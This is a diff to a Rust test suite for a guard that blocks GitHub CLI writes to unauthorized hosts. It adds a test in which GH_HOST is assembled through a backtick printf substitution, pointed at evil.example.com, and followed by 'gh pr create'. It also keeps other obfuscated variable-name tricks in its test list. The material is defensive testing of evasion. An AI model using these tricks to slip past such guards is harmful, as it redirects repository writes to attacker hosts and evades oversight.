@@ -8155,6 +8155,20 @@ mod tests {
         });
     }
 
+    /// cadence-hooks#1142: a literal `printf` substitution is read as the text
+    /// it prints, so the host this builds is `evil.example.com` — named in the
+    /// block, where the unread name once made the host unknown.
+    #[test]
+    fn a_host_name_built_by_a_literal_substitution_is_read() {
+        with_env(&owners_env(), || {
+            let command = "export GH_HOS`printf T`=evil.example.com; \
+                           gh pr create -R cameronsjo/x --title t";
+            let result = GhWriteGuard.run(&input_with(command, "/tmp"));
+            let meta = result.block_metadata.expect("expected a structured block");
+            assert_eq!(meta.rule_id, "gh-write-unauthorized-target");
+        });
+    }
+
     #[test]
     fn unmodeled_gh_host_changes_resolve_to_an_unknown_host() {
         with_env(&owners_env(), || {
@@ -8170,7 +8184,6 @@ mod tests {
                 "(( GH_HOST += 1 )); gh pr create -R cameronsjo/x --title t",
                 // #548 review I2: a name the shell builds at expansion time.
                 "export GH_HOS${X}T=evil.example.com; gh pr create -R cameronsjo/x --title t",
-                "export GH_HOS`printf T`=evil.example.com; gh pr create -R cameronsjo/x --title t",
                 "declare -x GH_HOS${X}T=evil.example.com; gh pr create -R cameronsjo/x --title t",
                 "typeset -x GH_HOST=evil.example.com; gh pr create -R cameronsjo/x --title t",
                 "builtin export GH_HOS${X}T=evil.example.com; gh pr create -R cameronsjo/x --title t",
